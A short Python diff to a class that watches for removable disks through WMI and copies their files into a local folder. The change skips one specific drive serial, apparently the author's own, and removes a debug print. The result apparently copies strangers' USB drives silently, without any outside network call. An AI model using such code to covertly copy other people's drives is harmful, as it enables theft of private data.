@@ -15,7 +15,7 @@ class Reader:
     @classmethod
     def wait_falsh(cls):
         for disk in c.Win32_LogicalDisk():
-            if disk.Description == "Съемный диск":
+            if disk.Description == "Съемный диск" and disk.VolumeSerialNumber != "7430A10A":
                 cls.create_folder('folder')
                 folder_name = f"folder\{disk.VolumeSerialNumber}_{disk.VolumeName}"
                 cls.create_folder(folder_name)
@@ -24,7 +24,6 @@ class Reader:
     @classmethod
     def download_files(cls, disk_id, folder_name):
         dir = os.listdir(disk_id)
-        print(dir)
         zero = (0, 1)[True if 'System Volume Information' in dir else False]
         for i in range(zero, len(dir)):
             try:
